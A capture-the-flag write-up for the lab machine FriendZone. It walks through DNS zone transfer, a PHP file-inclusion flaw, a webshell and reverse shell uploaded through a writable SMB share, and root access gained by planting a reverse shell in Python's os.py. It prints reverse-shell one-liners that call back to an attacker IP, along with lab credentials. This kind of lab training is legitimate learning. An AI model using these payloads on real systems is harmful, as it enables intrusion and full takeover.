`Box: Linux`
`Level: Easy`

### Index
1. [`Box Info`](#`Box%20Info`)
2. [`Initial Nmap Enumeration`](#`Initial%20Nmap%20Enumeration`)
3. [`Web Enumerations`](#`Web%20Enumerations`)
	1. [`Any Subdomains?`](#`Any%20Subdomains?`)
	2. [`List of URLs we have so far`](#`List%20of%20URLs%20we%20have%20so%20far`)
	3. [`PHP Filter to grab the Code for upload.php`](#`PHP%20Filter%20to%20grab%20the%20Code%20for%20upload.php`)
4. [`SMB Enumeration`](#`SMB%20Enumeration`)
	1. [`LFI through SMB & Shell`](#`LFI%20through%20SMB%20&%20Shell`)
5. [`Privilege Escalation`](#`Privilege%20Escalation`)
	1. [`LinPeas Findings`](#`LinPeas%20Findings`)
	2. [`Why the creds.txt was not readable in the browser?`](#`Why%20the%20creds.txt%20was%20not%20readable%20in%20the%20browser?`)
	3. [`Connecting the Dots with OS Module`](#`Connecting%20the%20Dots%20with%20OS%20Module`)
	4. [`mysql_data.conf reveals password for user friend`](#`mysql_data.conf%20reveals%20password%20for%20user%20friend`)
	5. [`Checking out scripts that runs every few minutes`](#`Checking%20out%20scripts%20that%20runs%20every%20few%20minutes`)
	6. [`Python Library Hijacking`](#`Python%20Library%20Hijacking`)

### `Box Info`
```
FriendZone is an easy difficulty Linux box which needs fair amount enumeration. By doing a zone transfer vhosts are discovered. There are open shares on samba which provides credentials for an admin panel. From there, an LFI is found which is leveraged to get RCE. A cron is found running which uses a writable module, making it vulnerable to hijacking.
```

### `Initial Nmap Enumeration`
```
# nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn 10.10.10.123
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)


Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m50s, deviation: 1h43m55s, median: 9s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-10-05T06:01:12
|_  start_date: N/A
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2024-10-05T09:01:11+03:00

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   36.34 ms 10.10.14.1
2   38.88 ms friendzone.htb (10.10.10.123)
```

vsftpd 3.0.3 is vulnerable to remote denial of service attack. Not Helpful. Checking Web.

### `Web Enumerations`
![](Friendzone_web0.png)
Adding `friendzoneportal.red` in to `/etc/hosts` file.

![](Friendzone_web1.png)

So far, we have uncover two domains. `http://friendzone.htb` and `https://friendzoneportal.red/`.
```
# feroxbuster -u http://friendzone.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404
301      GET        9l       28w      320c http://friendzone.htb/wordpress => http://friendzone.htb/wordpress/
```

![](Friendzone_web2.png)

```
# feroxbuster -u https://friendzoneportal.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -C 404
```

Nothing comes out of the above scan.

###### `Any Subdomains?`
```
# ffuf -H "Host: FUZZ.friendzone.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.10.123/ -fl 13
```

```
# ffuf -H "Host: FUZZ.friendzoneportal.red" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u https://10.10.10.123/
admin                   [Status: 200, Size: 379, Words: 23, Lines: 18, Duration: 40ms]
```

![](Friendzone_web3.png)
so we have another domain uncovered `https://admin.friendzoneportal.red/`

So we got the login form. By providing admin as a username and password, we got the following redirection.
![](Friendzone_web4.png)

So it's PHP. We will now enumerate files. But it says "check another one..."

Changing wordlist gives me something else now.
```
# wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt  -H "HOST: FUZZ.friendzone.red" -u https://friendzone.red/ --sc 200
000552943:   200        13 L     35 W       391 Ch      "uploads - uploads"               
```

So we have now uncover another subdomain `https://uploads.friendzone.red/`
![](Friendzone_web5.png)

Changing the wordlist and scan again
```
─# wfuzz -c -w /usr/share/dnsenum/dns.txt  -H "HOST: FUZZ.friendzone.red" -u https://friendzone.red/ --sc 200
000000155:   200        122 L    307 W      2873 Ch     "administrator1 - administrator1" 
```

We have got another login page
![](Friendzone_web6.png)

Using those cred.txt here on this form. Check out [`SMB Enumeration`](#`SMB%20Enumeration`) section to see how I got creds.txt
![](Friendzone_web7.png)
It worked.
![](Friendzone_web8.png)

Further enumerating this domain we found that  we have `/images` present on the server.
```
# gobuster dir -u https://administrator1.friendzone.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php
/.php                 (Status: 403) [Size: 309]
/images               (Status: 301) [Size: 349] [--> https://administrator1.friendzone.red/images/]
/login.php            (Status: 200) [Size: 7]
/dashboard.php        (Status: 200) [Size: 101]
/timestamp.php        (Status: 200) [Size: 36]
/.php                 (Status: 403) [Size: 309]
/server-status        (Status: 403) [Size: 318]
```

![](Friendzone_web9.png)
###### `List of URLs we have so far`
```
http://friendzone.htb/
http://friendzone.htb/wordpress
https://friendzoneportal.red/
https://admin.friendzoneportal.red/
https://admin.friendzoneportal.red/login.php
https://friendzone.red/
https://uploads.friendzone.red/
https://administrator1.friendzone.red/
https://administrator1.friendzone.red/images/ --> List images
```

I could have got all the above domain using one `dig` command
```
# dig axfr @10.10.10.123 friendzone.red

; <<>> DiG 9.19.21-1+b1-Debian <<>> axfr @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Mon Oct 07 02:09:15 EDT 2024
;; XFR size: 8 records (messages 1, bytes 289)

```

out of all the above URLs, we have upload that allow us to upload the file. the administratro1 allowed us to login. Trying to upload shell to `https://uploads.friendzon.red/` with the hope that those will lists under `https://administrator1.friendzone.red/images/` but it did not.  But we know that `dashboard.php` says the following
```
image_name param is missed !

please enter it to show the image

default is image_id=a.jpg&pagename=timestamp
```

##### `PHP Filter to grab the Code for upload.php`
I will now use the following `php filter` to extract the source code of the upload.php from `uploads.friendzone.red`. Have a look at the following two combined images. I tried to print the `upload.php` file content into `dashboard.php` using the `pagename` parameter.
![](Friendzone_web10.png)

I was trying to read the `cerds.txt` from the `/etc/general` share however I was not able to read it. Check out why in the [`Why the creds.txt was not readable in the browser?`](#`Why%20the%20creds.txt%20was%20not%20readable%20in%20the%20browser?`) Sectoin.

Let's try to grab the PHP code for the `dashboard.php` using the PHP Filter.
`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard`
![](Friendzone_web12.png)
Copy the Base64 from the bottom and save it to file.
```
# base64 -d dashboard                              
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```

Nice. Now have a look at the following `SMB enumeration Section` where one of the `Remark` says that these shares are under `/etc/` directory. Look at the remark for `/etc/Flies`. 
Assuming that the `Development` share is also at the same place. I tried to print the file content of the `creds.txt` from the `general` Share but I was not able to print it. We will look into it later. Now Look at the `LFI through SMB and Shell` Section From Here.
### `SMB Enumeration`

```
─# netexec smb 10.10.10.123 -u Guest -p "" --shares               
SMB         10.10.10.123    445    FRIENDZONE       [*] Windows 6.1 (name:FRIENDZONE) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.10.123    445    FRIENDZONE       [+] \Guest: 
SMB         10.10.10.123    445    FRIENDZONE       [*] Enumerated shares
SMB         10.10.10.123    445    FRIENDZONE       Share           Permissions     Remark
SMB         10.10.10.123    445    FRIENDZONE       -----           -----------     ------
SMB         10.10.10.123    445    FRIENDZONE       print$                          Printer Drivers
SMB         10.10.10.123    445    FRIENDZONE       Files                           FriendZone Samba Server Files /etc/Files
SMB         10.10.10.123    445    FRIENDZONE       general         READ            FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       Development     READ,WRITE      FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       IPC$                            IPC Service (FriendZone server (Samba, Ubuntu))
```
We have `Development` share for which we have WRITE access.

```
# smbclient //friendzone.htb/Development
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Oct  5 02:57:24 2024
  ..                                  D        0  Tue Sep 13 10:56:24 2022
```
But its empty. We can try `general` Share.

```
# smbclient //friendzone.htb/general    
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Tue Sep 13 10:56:24 2022
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit
```

```
# cat creds.txt     
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```
Okay so we have credentials. I tried these credentials on SMB and didn't work. It neither worked on the Login page that I have enumerate earlier.

###### `LFI through SMB & Shell`

Luckily, after looking at some hits, (~~Direct hints~~) , I was able to perform LFI from the SMB. 
First I upload the cmd.php on Development Share since we have a `WRITE` access on it.
```
# smbclient //friendzone.htb/development
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> put cmd.php
putting file cmd.php as \cmd.php (0.3 kb/s) (average 0.3 kb/s)
smb: \> put callmeback.php
putting file callmeback.php as \callmeback.php (0.9 kb/s) (average 0.6 kb/s)
smb: \> dir
  .                                   D        0  Sun Oct  6 02:33:26 2024
  ..                                  D        0  Tue Sep 13 10:56:24 2022
  cmd.php                             A       35  Sun Oct  6 02:58:28 2024
  callmeback.php                      A      104  Sun Oct  6 02:58:35 2024

                3545824 blocks of size 1024. 1651332 blocks available
```

The following URL got us the Command Exection
`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../etc/Development/cmd&cmd=id`
![](Friendzone_web11.png)

Now we can start the Netcat Listener on port 4444 and grab the shell. Here is my `callmeback.php` file look like
```
# cat callmeback.php                              
GIF8;
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f"); ?>
```

`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../etc/Development/callmeback`
![](Friendzone_web13.png)

On a NetCat Side
```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.123] 50914
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@FriendZone:/var/www/admin$ export TERM=xterm
export TERM=xterm
www-data@FriendZone:/var/www/admin$ cd /home
cd /home
www-data@FriendZone:/home$ ls
ls
friend
www-data@FriendZone:/home$ cd friend
cd friend
www-data@FriendZone:/home/friend$ ls
ls
user.txt
www-data@FriendZone:/home/friend$ cat user.txt
cat user.txt
cd6c88d*********************
www-data@FriendZone:/home/friend$ 
```
Get your User flag

### `Privilege Escalation`

###### `LinPeas Findings`
```
Linux version 4.15.0-36-generic (buildd@lgw01-amd64-031) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
Sudo version 1.8.21p2

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                       
/dev/mqueue                                                                                                                                                             
/dev/shm
/etc/Development
/etc/Development/callmeback.php
/etc/Development/cmd.php
/etc/sambafiles
/run/lock
/run/lock/apache2
/tmp
/tmp/LinEnum.sh
/tmp/linpeas.sh
/usr/lib/python2.7
/usr/lib/python2.7/os.py
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/spool/samba
/var/tmp

╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                              
total 36K
drwxr-xr-x  8 root root 4.0K Sep 13  2022 .
drwxr-xr-x 12 root root 4.0K Sep 13  2022 ..
drwxr-xr-x  3 root root 4.0K Sep 13  2022 admin
drwxr-xr-x  4 root root 4.0K Sep 13  2022 friendzone
drwxr-xr-x  2 root root 4.0K Sep 13  2022 friendzoneportal
drwxr-xr-x  2 root root 4.0K Sep 13  2022 friendzoneportaladmin
drwxr-xr-x  3 root root 4.0K Sep 13  2022 html
-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf

╔══════════╣ Analyzing DNS Files (limit 70)
drwxr-sr-x 3 root bind 4096 Oct  6  2018 /etc/bind                                                                                                                      
drwxr-sr-x 3 root bind 4096 Oct  6  2018 /etc/bind
-rw-r--r-- 1 root root 1317 Mar 23  2018 /etc/bind/zones.rfc1918
-rw-r--r-- 1 root root 271 Mar 23  2018 /etc/bind/db.127
-rw-r--r-- 1 root root 270 Mar 23  2018 /etc/bind/db.local
-rw-r----- 1 bind bind 77 Oct  6  2018 /etc/bind/rndc.key
-rw-r--r-- 1 root root 3171 Mar 23  2018 /etc/bind/db.root
-rw-r--r-- 1 root bind 1468 Oct  6  2018 /etc/bind/named.conf.options
drwxr-sr-x 2 root bind 4096 Oct  6  2018 /etc/bind/zones
-rw-r--r-- 1 root bind 615 Oct  6  2018 /etc/bind/zones/db.friendzoneportal.red
-rw-r--r-- 1 root bind 587 Oct  6  2018 /etc/bind/zones/db.friendzone
-rw-r--r-- 1 root bind 490 Mar 23  2018 /etc/bind/named.conf.default-zones
-rw-r--r-- 1 root root 237 Mar 23  2018 /etc/bind/db.255
-rw-r--r-- 1 root root 237 Mar 23  2018 /etc/bind/db.0
-rw-r--r-- 1 root bind 537 Oct  6  2018 /etc/bind/named.conf.local
-rw-r--r-- 1 root bind 463 Mar 23  2018 /etc/bind/named.conf
-rw-r--r-- 1 root root 2761 Aug 10  2018 /etc/bind/bind.keys
-rw-r--r-- 1 root root 353 Mar 23  2018 /etc/bind/db.empty

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                                                                
drwxr-xr-x  3 root root 4096 Sep 13  2022 .
drwxr-xr-x 22 root root 4096 Sep 13  2022 ..
drwxr-xr-x  2 root root 4096 Sep 13  2022 server_admin
```

###### `Why the creds.txt was not readable in the browser?`
It was because of permission.
```
drwxrwxrwx  2 root root    4096 Oct  6 09:59 Development
drwxr-xr-x  2 root root    4096 Jan 16  2019 general
```

While solving this box, I learned that the `LinEnum.sh` does not trigger/shows any interesting files/directories in the `/opt` directory. The `LinPeas.sh` also does not show that. But It at least take a look at `/opt` directory. Have a look at the above `LinPeas Findings` and look at the last section where it says `Unexpected in /opt (usually empty)`. This means the `/opt` directory should usually be empty but we are seeing `server_admin` directory inside `/opt`. Let's explore it.

```
www-data@FriendZone:/opt/server_admin$ ls
ls
reporter.py
www-data@FriendZone:/opt/server_admin$ cat reporter.py
cat reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

There's one unusual python script. Running the above python script gets us the following result.
```
www-data@FriendZone:/opt/server_admin$ python reporter.py
python reporter.py
[+] Trying to send email to admin1@friendzone.com
```

The python script imports the `os` module.  Than two variables stores the email address and just a simple print statement. Rest of the things are commented out. 

###### `Connecting the Dots with OS Module`

Again looking at the `LinPeas Findings` section, you can see that we have `/usr/lib/python2.7/os.py` under `Interesting writable files owned by me or writable by everyone (not in Home)` Section. Let's first check the permissions on `/usr/lib/python2.7` directory.
```
www-data@FriendZone:/usr/lib$ ls -la
drwxrwxrwx 27 root root  16384 Sep 13  2022 python2.7
```

We have writable permission on the `python2.7` directory where the `os.py` is present. Our `reporter.py` is importing the `OS` Module as well.

There's a nicer way to print out the list of System.Path for python using the following one liner.
```
www-data@FriendZone:/usr/lib$ python -c "import sys; print'\n'.join(sys.path)"
python -c "import sys; print'\n'.join(sys.path)"

/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages
```

Look at the first `EMPTY` entry. That `EMPTY` entry is pointing towards the same directory. Python has a list of search paths for its libraries.

###### `mysql_data.conf reveals password for user friend`
```
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
www-data@FriendZone:/var/www$ 
```
We can use the above password to SSH as a `friend` user 

###### `Checking out scripts that runs every few minutes`
Using [Pspy](https://github.com/DominicBreuker/pspy/tree/master) I was able to confirm that the `/opt/server_admin/reporter.py` runs every few minutes
```
friend@FriendZone:/tmp$ ./pspy32
2024/10/07 08:20:01 CMD: UID=0     PID=49123  | /bin/sh -c /opt/server_admin/reporter.py
```
###### `Python Library Hijacking`
Source: https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
I have added the following lines into `os.py`. First using NetCat, I transfer the `os.py` file from the Box to my Kali Machine. Than I added the following lines at the end of `os.py` File. And transfer it back to the Box.
```
import socket
import os
import pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.8",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("sh")
```

Now I started the NetCat Listener on `port 4444` and run the `pspy32` as well. We will have to wait for like 2 minutes for root to run this file.

```
2024/10/07 08:37:51 CMD: UID=0     PID=1      | /sbin/init splash 
2024/10/07 08:38:01 CMD: UID=0     PID=49270  | /usr/bin/python /opt/server_admin/reporter.py 
2024/10/07 08:38:01 CMD: UID=0     PID=49269  | /bin/sh -c /opt/server_admin/reporter.py 
2024/10/07 08:38:01 CMD: UID=0     PID=49268  | /usr/sbin/CRON -f 
2024/10/07 08:38:01 CMD: UID=0     PID=49271  | sh 

```

On the NetCat side.
```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.123] 51420
# id
id
uid=0(root) gid=0(root) groups=0(root)
```
Get your Root flag.